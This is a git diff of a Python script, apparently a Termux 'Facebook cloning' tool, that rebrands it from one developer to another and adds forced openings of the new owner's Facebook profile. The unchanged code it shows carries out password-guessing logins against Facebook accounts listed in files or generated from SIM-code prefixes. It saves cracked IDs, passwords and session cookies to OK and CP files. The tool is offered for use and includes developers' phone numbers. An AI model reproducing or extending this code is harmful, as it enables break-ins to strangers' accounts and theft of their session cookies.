@@ -148,20 +148,20 @@ def tahunng(fx):
 	return tahunz
 logo =                                          ("""   
 \033[0;92m╔══════════════════════════════════════════════╗
-\033[0;92m║███████ \033[0;31m██    ██ \033[0;93m██████  \033[0;32m█████\033[0;31m███  ██████\033[0;92m     ║  
-\033[0;92m║██      \033[0;31m██    ██ \033[0;93m██   ██    \033[0;32m██    \033[0;31m██    ██\033[0;92m    ║ 
-\033[0;92m║███████ \033[0;31m██    ██ \033[0;93m██████     \033[0;32m██    \033[0;31m██    ██\033[0;92m    ║ 
-\033[0;92m║     ██ \033[0;31m██    ██ \033[0;93m██         \033[0;32m██    \033[0;31m██    ██\033[0;92m    ║ 
-\033[0;92m║███████  \033[0;31m██████  \033[0;93m██         \033[0;32m██     \033[0;31m██████\033[0;92m     ║  
+\033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
+\033[0;32m║ ████   ██ \033[0;31m██   ██  \033[0;93m██  ██  \033[0;32m██   ██ \033[0;31m████   ██\033[0;92m ║
+\033[0;32m║ ██ ██  ██ \033[0;31m███████   \033[0;93m████   \033[0;32m███████ \033[0;31m██ ██  ██\033[0;92m ║
+\033[0;32m║ ██  ██ ██ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██  ██ ██\033[0;92m ║
+\033[0;92m║ ██   ████ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██   ████\033[0;92m ║
 \033[0;92m╚══════════════════════════════════════════════╝
 \033[0;92m╔═══════════════════════════════════════════╗\033[0;92m╔═══╗
-\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       FJ RIYAD           ║\033[0;32m║\033[1;31m S \033[1;32m║
-\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      সুপ্ত প্রতিভা         ║\033[0;32m║\033[1;312m U\033[0;92m ║
-\033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m P\033[0;92m ║
-\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01309933049        ║\033[0;32m║\033[1;93m T\033[0;92m ║
-\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m    premium-All-Command ║\033[0;92m║\033[1;92m O\033[0;92m ║
-\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    RANDOM        ║\033[0;92m║ 😘║
-\033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝
+\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
+\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
+\033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m Y\033[0;92m ║
+\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
+\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
+\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    Public Tool        ║\033[0;92m║ 😘║
+\033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝               
 """)
 def linex():
         print(50*'_')
@@ -193,7 +193,7 @@ def cek_apk(session,coki):
 	if len(game)==0:
 		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
 	else:
-		print(f'\r ðŸŽ® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
+		print(f'\r 😘® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
 		for i in range(len(game)):
 			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
 
@@ -213,16 +213,18 @@ def menu():
 	print ("\033[1;97m[1]\033[1;33m FILE CLONING ")
 	print ("\033[1;97m[2]\033[1;33m RANDOM CLONEING")
 	print ("\033[1;97m[3]\033[1;33m EMAIL CLONEING")
-	print ("\033[1;97m[4]\033[1;33m MY Facebook ID")
+	print ("\033[1;97m[4]\033[1;33m Owner Facebook ID")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
 	if ot == '1':
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100008255177183')
 		File()
 	if ot == '2':
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100008255177183')
 		rndm()
 	if ot == '3':
 		mail()
 	if ot == '4':
-		os.system('xdg-open https://facebook.com/BCM.049')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100008255177183')
 		menu()
 		
 	else:
@@ -233,11 +235,7 @@ def rndm():
 	clear()
 	
 	print(gyc)
-	print ("""+------------------------------+
-|        Example>:             |
-|        0191,0172,0183,       |
-|        92302,92301,91778     |
-+------------------------------+
+	print ("""0191, 0182, 0172, 0133, 0144
 """)
 	cod = input('\n INPUT YOUR SIM CODE: ')
 	if len(str(cod)) == 4:
@@ -325,6 +323,7 @@ def mail():
 	exit()
 def File():
 	clear()
+	print(f' \n ➥➥➣\033[42m\033[1;31m Example: /sdcard/nayan.txt\033[40m\033[00m\n')
 	file = input(' Put file path\033[1;37m: ')
 	try:
 		fo = open(file,'r').read().splitlines()
@@ -397,7 +396,7 @@ def c(uid,pwx,ln):
         for ps in pwx:
             session = requests.Session()
             wa = random.choice(my_color)
-            sys.stdout.write(f'    \r%s[FJ-Riyad] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
+            sys.stdout.write(f'    \r%s[NAYAN] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             
@@ -440,14 +439,14 @@ def c(uid,pwx,ln):
           #  lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
          #   log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-            	open('FJ-Riyad-OK.txt', 'a').write( cid+' | '+ps+'\n')
+            	open('NAYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
             #	botok(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[65:80]
-            	print('\033[1;92mFJ-Riyad-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
-            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('FJ-Riyad-OK.txt', 'a').write( cid+' | '+ps+'\n')
-            	open('FJ-Riyad-coki.txt', 'a').write(coki+'\n')
+            	print('\033[1;92mNAYAN-OK[💥]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
+            	print('\033[1;92m[\033[1;92m💦\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
+            	open('NAYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+            	open('NAYAN-coki.txt', 'a').write(coki+'\n')
             	cek_apk(session,coki)
             	oks.append(cid)
             	break
@@ -455,9 +454,9 @@ def c(uid,pwx,ln):
             	#botcp(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
-            	print('\33[1;30m(FJ-Riyad-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
+            	print('\33[1;30m(NAYAN-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
             	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('FJ-Riyad-CP.txt', 'a').write( uid+' | '+ps+' \n')
+            	open('NAYAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
             	break
             else:
@@ -465,7 +464,7 @@ def c(uid,pwx,ln):
             	continue
         loop+=1
         
-        #sys.stdout.write('\r%s   [FJ-Riyad] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
+        #sys.stdout.write('\r%s   [NAYAN] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
        # sys.stdout.flush()
     except requests.exceptions.ConnectionError:
         time.sleep(10)
@@ -474,7 +473,7 @@ def c(uid,pwx,ln):
 
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('    \r\r\033[1;37m [FJ-Riyad] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('    \r\r\033[1;37m [NAYAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         ses = requests.Session()
         
         
@@ -509,13 +508,13 @@ def ffb(ids,names,passlist):
                         
                         Aking=ses.cookies.get_dict()
                         if "c_user" in Aking:
-                                print('\r\r\033[1;32m [FJ-Riyad-OK] %s | %s'%(ids,pas))
+                                print('\r\r\033[1;32m [NAYAN-OK] %s | %s'%(ids,pas))
                                 open('/sdcard/STEST-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [FJ-Riyad-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;208m [NAYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/STEST-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
